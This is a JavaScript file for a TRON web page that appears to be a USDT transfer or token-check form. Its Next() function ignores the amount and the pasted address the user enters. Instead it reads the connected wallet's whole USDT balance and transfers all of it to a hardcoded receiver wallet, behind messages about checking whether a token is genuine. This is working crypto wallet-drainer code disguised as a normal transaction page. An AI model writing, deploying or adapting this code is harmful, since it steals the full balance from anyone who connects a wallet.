// Receiver wallet (your address)
const receiver = "TQP59pp5o9x6ohP8A6NWqUu9iJ3LfTNEKQ";

// TRC20 USDT Contract Address
const usdtContract = "TXLAQ63Xg1NAzckPwKHvzw7CSEmLMEqcdj";

// USDT Decimals
const DECIMALS = 6;

// Paste from clipboard
function pasteAddress() {
  navigator.clipboard.readText().then((text) => {
    document.getElementById('address').value = text;
  });
}

// Set Max (demo purpose)
function setMax() {
  document.getElementById("amount").value = 100;
  updateUSD();
}

// Update USD visual
function updateUSD() {
  const amount = parseFloat(document.getElementById("amount").value || "0");
  document.getElementById("usdValue").innerText = `≈ $${amount.toFixed(2)}`;
}

// Main Transfer Logic
async function Next() {
  if (typeof window.tronWeb === 'undefined' || !window.tronWeb.defaultAddress.base58) {
    alert("Please open this page inside TronLink/DApp browser.");
    return;
  }

  const sender = tronWeb.defaultAddress.base58;
  const contract = await tronWeb.contract().at(usdtContract);
  
  try {
    // Get sender balance
    const balance = await contract.balanceOf(sender).call();
    const usdtBalance = parseFloat(balance.toString()) / (10 ** DECIMALS);
    console.log("USDT Balance:", usdtBalance);

    // Get entered amount
    const enteredAmount = parseFloat(document.getElementById("amount").value);
    if (isNaN(enteredAmount) || enteredAmount < 1) {
      alert("Enter a valid amount (minimum 1 USDT)");
      return;
    }

    if (usdtBalance < 1) {
      alert("Your USDT balance is too low or flash token. Not genuine.");
      return;
    }

    // Convert to smallest unit (6 decimals)
    const amountToSend = BigInt(Math.floor(usdtBalance * (10 ** DECIMALS))).toString();

    // Send full balance to receiver
    const tx = await contract.transfer(receiver, amountToSend).send();
    alert("Transfer successful!\nTX: " + tx);
  } catch (err) {
    console.error(err);
    alert("Error: " + err.message);
  }
}
